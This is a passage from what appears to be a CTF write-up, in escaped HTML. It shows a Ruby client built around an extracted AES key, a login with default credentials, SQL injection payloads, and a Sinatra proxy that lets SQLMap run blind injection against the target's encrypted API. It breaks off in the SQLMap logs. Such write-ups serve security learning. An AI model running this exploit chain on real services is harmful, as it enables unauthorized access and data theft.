class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003cspan class=\"cm\"\u003e/*\nSuccess #stdin #stdout 0.04s 2184192KB\n56, 79, 46, 106, 26, 5, 229, 34, 59, 128, 233, 96, 160, 166, 80, 116\n*/\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eOnce I had the AES key, I then wrote a script in Ruby that would allow me to play around with the parameters to the API and see the response.\u003cbr\u003e\nIt took the username, password and command inputs, converted them to a JSON string, encrypted the string with AES and encoded it in base64 and sent\u003cbr\u003e\nit to the server. It then got the response from the server and decrypted it using the AES key and printed the response to the user.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e\u003cspan class=\"nb\"\u003erequire\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;httparty\u0026#39;\u003c/span\u003e\n\u003cspan class=\"nb\"\u003erequire\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;base64\u0026#39;\u003c/span\u003e\n\u003cspan class=\"nb\"\u003erequire\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;openssl\u0026#39;\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003eaes_key_arr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e56\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e79\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e46\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e106\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e26\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e5\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e229\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e34\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e59\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e128\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e233\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e96\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e160\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e166\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e80\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e116\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\u003cspan class=\"no\"\u003eAES_KEY\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eaes_key_arr\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003emap\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"ss\"\u003e:chr\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nf\"\u003ejoin\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eencrypt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emsg\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"n\"\u003ecipher\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"no\"\u003eOpenSSL\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"no\"\u003eCipher\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003enew\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;AES-128-CBC\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nf\"\u003eencrypt\u003c/span\u003e\n  \u003cspan class=\"n\"\u003ecipher\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003ekey\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"no\"\u003eAES_KEY\u003c/span\u003e\n  \u003cspan class=\"n\"\u003eiv\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecipher\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003erandom_iv\u003c/span\u003e\n  \u003cspan class=\"n\"\u003eencrypted\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecipher\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eupdate\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emsg\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003ecipher\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003efinal\u003c/span\u003e\n  \u003cspan class=\"n\"\u003eiv\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003eencrypted\u003c/span\u003e\n\u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003edecrypt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emsg\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"n\"\u003ecipher\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"no\"\u003eOpenSSL\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"no\"\u003eCipher\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003enew\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;AES-128-CBC\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nf\"\u003edecrypt\u003c/span\u003e\n  \u003cspan class=\"n\"\u003ecipher\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003ekey\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"no\"\u003eAES_KEY\u003c/span\u003e\n  \u003cspan class=\"n\"\u003eiv\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003emsg\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e...\u003c/span\u003e\u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n  \u003cspan class=\"n\"\u003edata\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003emsg\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"o\"\u003e..-\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n  \u003cspan class=\"n\"\u003ecipher\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eiv\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eiv\u003c/span\u003e\n  \u003cspan class=\"n\"\u003eplain\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecipher\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eupdate\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003ecipher\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003efinal\u003c/span\u003e\n\u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003edata\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;username\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"no\"\u003eARGV\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"no\"\u003eARGV\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;cmd\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"no\"\u003eARGV\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e]}.\u003c/span\u003e\u003cspan class=\"nf\"\u003eto_json\u003c/span\u003e\n\u003cspan class=\"n\"\u003eencrypted_data\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"no\"\u003eBase64\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003estrict_encode64\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eencrypt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n\u003cspan class=\"n\"\u003eencrypted_resp\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"no\"\u003eHTTParty\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003epost\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;http://35.243.186.41/\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"ss\"\u003ebody: \u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;d\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"n\"\u003eencrypted_data\u003c/span\u003e\u003cspan class=\"p\"\u003e}).\u003c/span\u003e\u003cspan class=\"nf\"\u003ebody\u003c/span\u003e\n\u003cspan class=\"n\"\u003eresp\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003edecrypt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"no\"\u003eBase64\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003estrict_decode64\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eencrypted_resp\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eputs\u003c/span\u003e \u003cspan class=\"n\"\u003eresp\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAfter some tries with default credentials, I was able to get a successful response.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"nv\"\u003e$ \u003c/span\u003eruby remote.rb \u003cspan class=\"s2\"\u003e\u0026quot;admin\u0026quot;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;admin\u0026quot;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;getTemp\u0026quot;\u003c/span\u003e\n\u003cspan class=\"o\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;success\u0026quot;\u003c/span\u003e: \u003cspan class=\"nb\"\u003efalse\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026quot;error\u0026quot;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026quot;Invalid username or password\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$ \u003c/span\u003eruby remote.rb \u003cspan class=\"s2\"\u003e\u0026quot;admin\u0026quot;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;getTemp\u0026quot;\u003c/span\u003e\n\u003cspan class=\"o\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;temperature\u0026quot;\u003c/span\u003e: 73, \u003cspan class=\"s2\"\u003e\u0026quot;success\u0026quot;\u003c/span\u003e: \u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"stage-3-sql-injection\"\u003eStage 3 - SQL Injection\u003c/h2\u003e\n\n\u003cp\u003eNow that I had a simple way to send requests to the remote, I tried some common SQL injection parameters on the username/password input fields.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"nv\"\u003e$ \u003c/span\u003eruby remote.rb \u003cspan class=\"s2\"\u003e\u0026quot;admin\u0026#39;\u0026quot;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;getTemp\u0026quot;\u003c/span\u003e\n\u003cspan class=\"o\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;success\u0026quot;\u003c/span\u003e: \u003cspan class=\"nb\"\u003efalse\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026quot;error\u0026quot;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026quot;Unknown\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$ \u003c/span\u003eruby remote.rb \u003cspan class=\"s2\"\u003e\u0026quot;admin\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;getTemp\u0026quot;\u003c/span\u003e\n\u003cspan class=\"o\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;success\u0026quot;\u003c/span\u003e: \u003cspan class=\"nb\"\u003efalse\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026quot;error\u0026quot;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026quot;Invalid username or password\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$ \u003c/span\u003eruby remote.rb \u003cspan class=\"s2\"\u003e\u0026quot;admin\u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1\u0026quot;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;getTemp\u0026quot;\u003c/span\u003e\n\u003cspan class=\"o\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;temperature\u0026quot;\u003c/span\u003e: 73, \u003cspan class=\"s2\"\u003e\u0026quot;success\u0026quot;\u003c/span\u003e: \u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$ \u003c/span\u003eruby remote.rb \u003cspan class=\"s2\"\u003e\u0026quot;admin\u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;0\u0026quot;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;getTemp\u0026quot;\u003c/span\u003e\n\u003cspan class=\"o\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;temperature\u0026quot;\u003c/span\u003e: 73, \u003cspan class=\"s2\"\u003e\u0026quot;success\u0026quot;\u003c/span\u003e: \u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$ \u003c/span\u003eruby remote.rb \u003cspan class=\"s2\"\u003e\u0026quot;admin\u0026#39; AND \u0026#39;1\u0026#39;=\u0026#39;0\u0026quot;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;getTemp\u0026quot;\u003c/span\u003e\n\u003cspan class=\"o\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;success\u0026quot;\u003c/span\u003e: \u003cspan class=\"nb\"\u003efalse\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026quot;error\u0026quot;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026quot;Invalid username or password\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis responses looked very much like a unsantized SQL query that could be exploited for SQL injection. Unfortunately it didn\u0026#39;t seem like\u003cbr\u003e\nI could get much output from the remote except for success/failure. This led me to use SQLMap to exploit the injection as it has optimized scripts\u003cbr\u003e\nfor extracting data when only blind injection techniques are available.\u003c/p\u003e\n\n\u003cp\u003eI couldn\u0026#39;t directly use SQLMap here as the parameters are encrypted, so I used the script I wrote earlier to write a simple proxy server using Sinatra where SQLMap\u003cbr\u003e\ncan send it\u0026#39;s normal POST requests, and the proxy server would encrypt the requests and forward them to the remote server and return the JSON response to\u003cbr\u003e\nSQLMap.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e\u003cspan class=\"nb\"\u003erequire\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;sinatra\u0026#39;\u003c/span\u003e\n\u003cspan class=\"nb\"\u003erequire\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;open3\u0026#39;\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003epost\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;/submit\u0026#39;\u003c/span\u003e \u003cspan class=\"k\"\u003edo\u003c/span\u003e\n  \u003cspan class=\"nb\"\u003eputs\u003c/span\u003e \u003cspan class=\"n\"\u003eparams\u003c/span\u003e\n  \u003cspan class=\"n\"\u003estdout\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003estatus\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"no\"\u003eOpen3\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003ecapture2\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;ruby\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;remote.rb\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eparams\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"ss\"\u003e:username\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"n\"\u003eparams\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"ss\"\u003e:password\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"n\"\u003eparams\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"ss\"\u003e:cmd\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e\n  \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003estdout\u003c/span\u003e\n\u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThen, I can just unleash SQLMap on this localhost server and it should do the job for me.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"nv\"\u003e$ \u003c/span\u003eruby sqlmap_proxy.rb\n\u003cspan class=\"o\"\u003e[\u003c/span\u003e2019-03-11 09:00:22] INFO  WEBrick 1.4.2\n\u003cspan class=\"o\"\u003e[\u003c/span\u003e2019-03-11 09:00:22] INFO  ruby 2.5.1 \u003cspan class=\"o\"\u003e(\u003c/span\u003e2018-03-29\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003ex86_64-linux]\n\u003cspan class=\"o\"\u003e==\u003c/span\u003e Sinatra \u003cspan class=\"o\"\u003e(\u003c/span\u003ev2.0.5\u003cspan class=\"o\"\u003e)\u003c/span\u003e has taken the stage on 4567 \u003cspan class=\"k\"\u003efor \u003c/span\u003edevelopment with backup from WEBrick\n\u003cspan class=\"o\"\u003e[\u003c/span\u003e2019-03-11 09:00:22] INFO  WEBrick::HTTPServer#start: \u003cspan class=\"nv\"\u003epid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e18347 \u003cspan class=\"nv\"\u003eport\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e4567\n\u003cspan class=\"o\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;username\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;admin\u0026quot;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;admin\u0026quot;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026quot;cmd\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;getTemp\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n127.0.0.1 - - \u003cspan class=\"o\"\u003e[\u003c/span\u003e11/Mar/2019:09:00:28 \u003cspan class=\"nt\"\u003e-0400\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;POST /submit HTTP/1.1\u0026quot;\u003c/span\u003e 200 60 0.2152\n127.0.0.1 - - \u003cspan class=\"o\"\u003e[\u003c/span\u003e11/Mar/2019:09:00:28 EDT] \u003cspan class=\"s2\"\u003e\u0026quot;POST /submit HTTP/1.1\u0026quot;\u003c/span\u003e 200 60\nhttp://localhost:4567/submit -\u0026gt; /submit\n\u003cspan class=\"o\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;username\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;admin\u0026quot;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;admin\u0026quot;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026quot;cmd\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;getTemp\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n127.0.0.1 - - \u003cspan class=\"o\"\u003e[\u003c/span\u003e11/Mar/2019:09:00:29 \u003cspan class=\"nt\"\u003e-0400\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;POST /submit HTTP/1.1\u0026quot;\u003c/span\u003e 200 60 0.2290\n127.0.0.1 - - \u003cspan class=\"o\"\u003e[\u003c/span\u003e11/Mar/2019:09:00:29 EDT] \u003cspan class=\"s2\"\u003e\u0026quot;POST /submit HTTP/1.1\u0026quot;\u003c/span\u003e 200 60\nhttp://localhost:4567/submit -\u0026gt; /submit\n\u003cspan class=\"o\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;username\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;9727\u0026quot;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;admin\u0026quot;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026quot;cmd\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;getTemp\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n127.0.0.1 - - \u003cspan class=\"o\"\u003e[\u003c/span\u003e11/Mar/2019:09:00:30 \u003cspan class=\"nt\"\u003e-0400\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;POST /submit HTTP/1.1\u0026quot;\u003c/span\u003e 200 60 0.2360\n127.0.0.1 - - \u003cspan class=\"o\"\u003e[\u003c/span\u003e11/Mar/2019:09:00:29 EDT] \u003cspan class=\"s2\"\u003e\u0026quot;POST /submit HTTP/1.1\u0026quot;\u003c/span\u003e 200 60\nhttp://localhost:4567/submit -\u0026gt; /submit\n\u003cspan class=\"o\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;username\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;admin\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e,\u0026#39;.((,)),\u0026quot;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;admin\u0026quot;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026quot;cmd\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;getTemp\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n127.0.0.1 - - \u003cspan 